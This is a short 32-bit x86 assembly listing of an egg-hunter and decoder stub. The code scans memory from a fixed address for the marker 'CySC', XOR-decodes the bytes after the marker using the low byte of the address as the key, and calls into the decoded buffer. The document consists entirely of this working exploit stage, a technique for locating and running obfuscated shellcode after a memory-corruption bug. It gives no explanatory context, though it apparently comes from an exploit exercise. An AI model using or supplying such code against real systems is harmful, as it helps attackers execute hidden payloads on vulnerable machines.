BITS 32

start:

      mov eax, 0xb7469FFF
      mov ebx, 'CySC'
compare:

      inc eax
      cmp [eax], ebx
      jne compare

foundit:
      xor ecx, ecx
      mov cl, al
      xor ebx, ebx

deobfuscate:
      dec bl
      xor [eax+ebx],al
      cmp bl, 0x4
      jne deobfuscate

execute:
      add eax, 4
      call eax
